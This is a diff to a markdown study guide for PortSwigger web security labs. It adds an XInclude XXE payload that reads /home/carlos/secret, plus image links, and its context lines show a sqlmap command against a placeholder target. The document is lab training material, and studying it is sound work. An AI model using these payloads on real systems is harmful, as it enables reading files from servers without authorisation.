@@ -391,6 +391,8 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 %26entity;
 ```  
 
+![Identify XML Injections](identify-xxe.png)
+
 ### DTD Hosted Exploit  
 
 >On the exploit server host a exploit file with DTD extension, containing the following payload.  
@@ -426,6 +428,11 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML documentcannot be defined a DTD file cannot be used. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file is possible.  
 
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
+```  
+
+![XInclude to retrieve files](xinclude.png)  
 
 [PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
 
